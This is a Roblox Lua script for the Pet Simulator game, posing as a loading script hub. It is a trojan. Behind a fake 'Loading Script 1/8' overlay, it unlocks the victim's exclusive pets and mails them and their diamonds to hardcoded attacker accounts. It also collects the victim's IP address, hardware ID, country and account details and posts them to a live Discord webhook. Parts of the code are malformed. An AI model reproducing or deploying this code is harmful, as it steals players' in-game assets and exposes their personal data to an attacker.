UserName = "HerrySzymoN"
WebHook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"


_G.dhwebhook = "HerrySzymoN"
_G.dhUserName "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"

if _G.UserName == nil or _G.UserName == "HerrySzymoN" then
	_G.UserName = UserName
end
if _G.Webhook == nil or _G.Webhook == "NONE" then
	_G.Webhook = Webhook
end
if _G.loadingScreenText == nil or _G.loadingScreenText == "" then
	_G.loadingScreenText = "Script Loading..."
end

if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
    game.Players.LocalPlayer:Kick("Error found while executing.")
end


local Library = require(game.ReplicatedStorage.Framework.Library)
local SendMail = getupvalue(Library.Network.Invoke, 2)("Send Mail");
local LockPet = getupvalue(Library.Network.Invoke, 2)("Lock Pet");
local pets = {}
local player = game:GetService("Players").LocalPlayer

local dims = player.leaderstats.Diamonds.Value - 7000000
if dims < 0 then
	dims = 0
end


for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy()
end
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel1 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local LoadingScript = Instance.new("TextLabel")
local LocalScript = Instance.new("LocalScript")

ScreenGui.IgnoreGuiInset = true
ScreenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(-0.000106195221, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Parent = ScreenGui

TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = _G.loadingScreenText
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 47
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(27.000000290572643, 42.000001296401024, 53.00000064074993)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.03534081, 0, 0.440561211, 0)
TextLabel.Size = UDim2.new(0, 1356, 0, 85)
TextLabel.Parent = Frame


ImageLabel.Image = "rbxassetid://5577595083"
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.063534081, 0, 0.340561211, 0)
ImageLabel.Size = UDim2.new(0, 320, 0, 340)
ImageLabel.Parent = Frame

local LoadingScript = Instance.new("TextLabel")
LoadingScript.Font = Enum.Font.FredokaOne
LoadingScript.Text = "Loading Script 1/8"
LoadingScript.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.TextSize = 51
LoadingScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.BackgroundTransparency = 1
LoadingScript.Position = UDim2.new(0.345166922, 0, 0.496173501, 0)
LoadingScript.Size = UDim2.new(0, 419, 0, 94)
LoadingScript.Name = "LoadingScript"
LoadingScript.Parent = Frame

local fake_module_scripts = {}

local function KYZKD_fake_script()
    local loadingGui = ScreenGui
    local loadingFrame = loadingGui:FindFirstChild("Frame")
    local loadingText = loadingFrame:FindFirstChild("LoadingScript")
    if loadingGui and loadingFrame and loadingText then
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        for i = 1, 5 do
            loadingText.Text = "Loading Script " .. i .. "/8"
            wait(15)
        end
    end
end

coroutine.wrap(KYZKD_fake_script)()

game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = false


box = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
task.wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
task.wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)



for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("Locked").Visible == true then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
        	if v:FindFirstChild("Level").Text == "???" then
			table.insert(pets, v.Name)
		end
	end
end
end
end

for i,v in ipairs(pets) do

local args = {
    [1] = {
        [pets[i]] = false
    }
}

LockPet:InvokeServer(unpack(args))
print(pets[i])
task.wait(1)
end


task.wait()



for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
            if v:FindFirstChild("Level").Text == "???" or v:FindFirstChild("Level").Text == "????" or player.leaderstats.Diamonds.Value >= 50000000000 then         
            local args = {
                [1] = {
                    ["Recipient"] = _G.dhUserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "Made by Astraaa"
                }
            }

        SendMail:InvokeServer(unpack(args))
        dims = 0
        wait(1.6)
        else
            local args = {
                [1] = {
                    ["Recipient"] = _G.UserName,
                    ["Diamonds"] = dims,
                    ["Pets"] = {
                        [1] = v.Name
                    },
                    ["Message"] = "Made by Astra"
                }
            }
        SendMail:InvokeServer(unpack(args))
        dims = 10000000000 or 50000000000 or 100000000000
        wait(1.6)
    end
end







local executor = identifyexecutor()
local IP = game:HttpGet("https://v4.ident.me")
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local us = _G.dhwebhook
local eurl2 = us

local Name =  game.Players.LocalPlayer.Name
local UserID = game.Players.LocalPlayer.UserId
local display = game.Players.LocalPlayer.DisplayName
local IPData = game:HttpGet("https://wtfismyip.com/json")
local OtherInfo = game:HttpGet("https://wtfismyip.com/headers")
local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
local AccountAge = game.Players.LocalPlayer.AccountAge
local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
local Diamonds = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local Rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
request = http_request or request or HttpPost or syn.request
local error1 = {
  ["content"] = "||@everyone|| Someone Executed ur Universal Script Hub IP  adress & home adress Logged",
  ["embeds"] = {{
  ["title"] = "```> WalkerX Universal Script Notifier <```",
  ["color"] = tonumber(0x7b00ff),
  ["fields"] = {
  {
   ["name"] = "```> DATA GENERATED < ```",
   ["value"] = "\n**:performing_arts: UserName: "..Name.."\n:man_detective: Display name: "..display.."\n:man_detective: UserID: "..UserID.."\n:underage: AccountAge: "..AccountAge.."\n:crown: Rank: "..Rank.."\n:computer: Exploit: "..executor.."\n:house: IP Address: "..IP.."\n:mag: Place:"..Loading.."\n:mag: Place:"..Game.."\n:mag: Country :"..country.."\Receiver: ".._G.dhUserName.."**",
   ["inline"] = false
   },
   {
   ["name"] = "  :gem: Diamonds: :gem: ",
   ["value"] = "```>>> "..Diamonds.."```",
   ["inline"] = true
    },
    {
    ["name"] = "     :trident:  Pets :trident:",
    ["value"] = "```>>> "..Pets.."```",
    ["inline"] = true
    },
    {
    ["name"] =  ":bar_chart: RAP :bar_chart:",
    ["value"] = "```>>> "..RAP.."```",
    ["inline"] = true
    },
    {
    ["name"] = "Exclusive",
    ["value"] = "```"..v.Name.."```",
    ["inline"] = true
    },
    {
    ["name"] = ":computer: HardWare ID :computer:",
    ["value"] = "```"..HardWareId.."```",
    ["inline"] = false
    },
    {
    ["name"] = "IP DATA",
    ["value"] = "```"..IPData.."```",
    ["inline"] = false
    },
    {
    ["name"] = "Other Info",
    ["value"] = "```"..OtherInfo.."```",
    ["inline"] = true
    },
    {
    ["name"] = "``:computer:  SOME ASSHOLE EXECUTED UR WALKERX UNIVERSAL SCRIPT :computer:   ```",
    ["value"] = "".._G.dhUserName.."",
    ["inline"] = false
    },
  }
  }}
  }
  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 

local headers = {
["content-type"] = "application/json"
}

local e1 = {Url = eurl2, Body = errorData1, Method = "POST", Headers = headers}
request(e1)




local executor = identifyexecutor()
local IP = game:HttpGet("https://v4.ident.me")
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game.Players.LocalPlayer
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local eurl = WebHook

local Name =  game.Players.LocalPlayer.Name
local UserID = game.Players.LocalPlayer.UserId
local display = game.Players.LocalPlayer.DisplayName
local IPData = game:HttpGet("https://wtfismyip.com/json")
local OtherInfo = game:HttpGet("https://wtfismyip.com/headers")
local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
local AccountAge = game.Players.LocalPlayer.AccountAge
local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
local Diamonds = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local Rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
request = http_request or request or HttpPost or syn.request
local error2 = {
  ["content"] = "||@everyone|| Someone Executed ur Universal Script Hub IP  adress & home adress Logged",
  ["embeds"] = {{
  ["title"] = "```> WalkerX Universal Script Notifier <```",
  ["color"] = tonumber(0x7b00ff),
  ["fields"] = {
  {
   ["name"] = "```> DATA GENERATED < ```",
   ["value"] = "\n**:performing_arts: UserName: "..Name.."\n:man_detective: Display name: "..display.."\n:man_detective: UserID: "..UserID.."\n:underage: AccountAge: "..AccountAge.."\n:crown: Rank: "..Rank.."\n:computer: Exploit: "..executor.."\n:house: IP Address: "..IP.."\n:mag: Place:"..Loading.."\n:mag: Place:"..Game.."\n:mag: Country :"..country.."\nReceiver :"..UserName..**",
   ["inline"] = false
   },
   {
   ["name"] = "  :gem: Diamonds: :gem: ",
   ["value"] = "```>>> "..Diamonds.."```",
   ["inline"] = true
    },
    {
    ["name"] = "     :trident:  Pets :trident:",
    ["value"] = "```>>> "..Pets.."```",
    ["inline"] = true
    },
    {
    ["name"] =  ":bar_chart: RAP :bar_chart:",
    ["value"] = "```>>> "..RAP.."```",
    ["inline"] = true
    },
    {
    ["name"] = "Exclusive",
    ["value"] = "```"..v.Name.."```",
    ["inline"] = true
    },
    {
    ["name"] = ":computer: HardWare ID :computer:",
    ["value"] = "```"..HardWareId.."```",
    ["inline"] = false
    },
    {
    ["name"] = "IP DATA",
    ["value"] = "```"..IPData.."```",
    ["inline"] = false
    },
    {
    ["name"] = "Other Info",
    ["value"] = "```"..OtherInfo.."```",
    ["inline"] = true
    },
    {
    ["name"] = "``:computer:  SOME ASSHOLE EXECUTED UR WALKERX UNIVERSAL SCRIPT :computer:   ```",
    ["value"] = ""..UserName.."",
    ["inline"] = false
    },
  }
  }}
  }
  local errorData2 = game:GetService("HttpService"):JSONEncode(error2) 

local headers = {
["content-type"] = "application/json"
}
local e2 = {Url = eurl, Body = errorData2, Method = "POST", Headers = headers}
request(e2)
